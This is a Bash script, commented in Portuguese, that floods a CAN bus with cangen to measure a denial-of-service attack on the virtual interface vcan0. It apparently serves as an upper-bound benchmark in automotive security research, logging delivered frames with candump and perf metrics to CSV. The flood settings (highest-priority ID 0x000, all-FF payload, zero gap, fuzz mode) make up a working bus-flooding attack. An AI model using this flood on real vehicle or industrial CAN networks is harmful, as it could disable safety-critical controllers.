# O script de DoS usando PYthon é limitado pelo GIL e pelo overhead
# do interpretador Python. Para estabelecer um LIMITE SUPERIOR de estresse usamos `cangen`, ferramenta em C nativa do pacote can-utils,
# que escreve diretamente em SocketCAN via raw socket sem qualquer camada
# interpretada.

set -euo pipefail

IFACE="vcan0"
DURATION=30          # segundos
GAP_MS=0             # intervalo entre frames; 0 = vazão máxima
MODE="fixed"         # fixed | fuzz
ID_HEX="000"         # usado quando mode=fixed
PAYLOAD="FFFFFFFFFFFFFFFF"
LOGFILE=""           # se vazio, gera nome com timestamp

usage() {
    sed -n '2,40p' "$0"
    exit 0
}

while getopts "i:d:g:m:I:p:l:h" opt; do
    case "$opt" in
        i) IFACE="$OPTARG" ;;
        d) DURATION="$OPTARG" ;;
        g) GAP_MS="$OPTARG" ;;
        m) MODE="$OPTARG" ;;
        I) ID_HEX="$OPTARG" ;;
        p) PAYLOAD="$OPTARG" ;;
        l) LOGFILE="$OPTARG" ;;
        h|*) usage ;;
    esac
done

if [[ -z "$LOGFILE" ]]; then
    LOGFILE="cangen_$(date +%Y%m%d_%H%M%S).log"
fi

# Monta argumentos do cangen
case "$MODE" in
    fixed)
        CANGEN_ARGS=(-g "$GAP_MS" -I "$ID_HEX" -L 8 -D "$PAYLOAD")
        echo "[INFO] Modo FIXED  | ID=0x$ID_HEX | payload=$PAYLOAD"
        ;;
    fuzz)
        CANGEN_ARGS=(-g "$GAP_MS" -I r -L r -D r)
        echo "[INFO] Modo FUZZ   | ID/DLC/payload aleatórios"
        ;;
    *)
        echo "[ERRO] modo inválido: $MODE (use fixed|fuzz)" >&2
        exit 1
        ;;
esac

echo "[INFO] iface=$IFACE | duração=${DURATION}s | gap=${GAP_MS}ms"
echo "[INFO] log de captura paralela: $LOGFILE"
echo

# Sniffer paralelo para contar frames realmente entregues no barramento.
candump -tA -L "$IFACE" > "$LOGFILE" &
DUMP_PID=$!

# Disparo do ataque com timeout duro.
START=$(date +%s.%N)
if [[ -n "${PERF_CSV:-}" && -n "${PERF_EVENTS:-}" ]]; then
    PERF_RAW="${PERF_CSV}.raw"
    LC_NUMERIC=C perf stat -x ';' -e "$PERF_EVENTS" \
        -o "$PERF_RAW" \
        -- timeout --preserve-status "${DURATION}s" \
           cangen "$IFACE" "${CANGEN_ARGS[@]}" || true
else
    timeout --preserve-status "${DURATION}s" \
        cangen "$IFACE" "${CANGEN_ARGS[@]}" || true
fi
END=$(date +%s.%N)

# Encerra o sniffer e calcula métricas do barramento.
kill "$DUMP_PID" 2>/dev/null || true
wait "$DUMP_PID" 2>/dev/null || true

ELAPSED=$(awk -v s="$START" -v e="$END" 'BEGIN{printf "%.3f", e-s}')
N_FRAMES=$(wc -l < "$LOGFILE")
RATE=$(awk -v n="$N_FRAMES" -v t="$ELAPSED" 'BEGIN{ if (t>0) printf "%.0f", n/t; else print 0 }')

ATTACK_LABEL="${ATTACK_LABEL:-dos-cangen}"
RUN_NUM="${RUN_NUM:-0}"

# Escrita unificada do CSV: perf + candump no mesmo arquivo.
if [[ -n "${PERF_CSV:-}" ]]; then
    echo "attack;run;metric;value;unit" > "$PERF_CSV"

    if [[ -f "${PERF_CSV}.raw" ]]; then
        while IFS=';' read -r value unit event _rest; do
            [[ -z "$value" || "$value" == \#* ]] && continue
            value="${value// /}"
            event="${event// /}"
            [[ -z "$event" ]] && continue
            echo "${ATTACK_LABEL};${RUN_NUM};${event};${value};${unit}" >> "$PERF_CSV"
        done < "${PERF_CSV}.raw"
        rm -f "${PERF_CSV}.raw"
    fi

    echo "${ATTACK_LABEL};${RUN_NUM};fps;${RATE};fps" >> "$PERF_CSV"
    echo "${ATTACK_LABEL};${RUN_NUM};frames;${N_FRAMES};frames" >> "$PERF_CSV"
    echo "${ATTACK_LABEL};${RUN_NUM};elapsed_s;${ELAPSED};s" >> "$PERF_CSV"
fi

echo
echo "=============================================="
echo "[RESULTADO] cangen DoS"
echo "  Interface .......... $IFACE"
echo "  Modo ............... $MODE"
echo "  Duração medida ..... ${ELAPSED}s"
echo "  Frames no barramento ${N_FRAMES}"
echo "  Vazão média ........ ${RATE} fps"
echo "  Log .............. $LOGFILE"
echo "=============================================="